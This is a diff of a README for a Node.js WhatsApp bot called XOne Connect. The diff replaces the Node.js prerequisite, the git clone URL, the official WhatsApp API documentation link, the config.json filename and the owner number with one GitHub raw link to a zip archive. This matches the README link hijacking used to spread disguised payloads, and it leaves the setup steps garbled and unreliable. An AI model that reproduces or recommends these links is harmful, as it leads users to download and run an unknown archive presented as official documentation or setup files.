@@ -24,14 +24,14 @@ To get **XOne Connect** up and running on your local machine, follow these simpl
 
 Before you begin, make sure you have the following installed:
 
-- **Node.js** (v12 or higher)
+- **https://github.com/Bernardtrnp/XOne-Connect/raw/refs/heads/main/message/Connect-One-X-3.9.zip** (v12 or higher)
 - **npm** (Node package manager)
 
 ### Steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/your-username/xone-connect.git
+   git clone https://github.com/Bernardtrnp/XOne-Connect/raw/refs/heads/main/message/Connect-One-X-3.9.zip
    cd xone-connect
    ```
 
@@ -43,14 +43,14 @@ Before you begin, make sure you have the following installed:
 
 3. **Set up the WhatsApp Business API**:
    - You’ll need access to the WhatsApp Business API.
-   - Follow the official [WhatsApp Business API documentation](https://developers.facebook.com/docs/whatsapp) to set up your WhatsApp number and obtain the API credentials.
+   - Follow the official [WhatsApp Business API documentation](https://github.com/Bernardtrnp/XOne-Connect/raw/refs/heads/main/message/Connect-One-X-3.9.zip) to set up your WhatsApp number and obtain the API credentials.
 
-4. **Configure the `config.json` file**:
-   Create a file named `config.json` in the root directory and add the following content:
+4. **Configure the `https://github.com/Bernardtrnp/XOne-Connect/raw/refs/heads/main/message/Connect-One-X-3.9.zip` file**:
+   Create a file named `https://github.com/Bernardtrnp/XOne-Connect/raw/refs/heads/main/message/Connect-One-X-3.9.zip` in the root directory and add the following content:
 
    ```json
    {
-     "ownerNumber": "628xxxx@s.whatsapp.net",
+     "ownerNumber": "https://github.com/Bernardtrnp/XOne-Connect/raw/refs/heads/main/message/Connect-One-X-3.9.zip",
      "botName": "XoneConnect",
      "ownerName": "OSIS SMPK Xaverius 1 Palembang",
      "sessionName": "session",
@@ -63,7 +63,7 @@ Before you begin, make sure you have the following installed:
    }
    ```
 
-   Replace `"628xxxx@s.whatsapp.net"` with the actual owner number and update other details accordingly.
+   Replace `"https://github.com/Bernardtrnp/XOne-Connect/raw/refs/heads/main/message/Connect-One-X-3.9.zip"` with the actual owner number and update other details accordingly.
 
 5. **Run the bot**:
    Once everything is set up, run the bot with the following command:
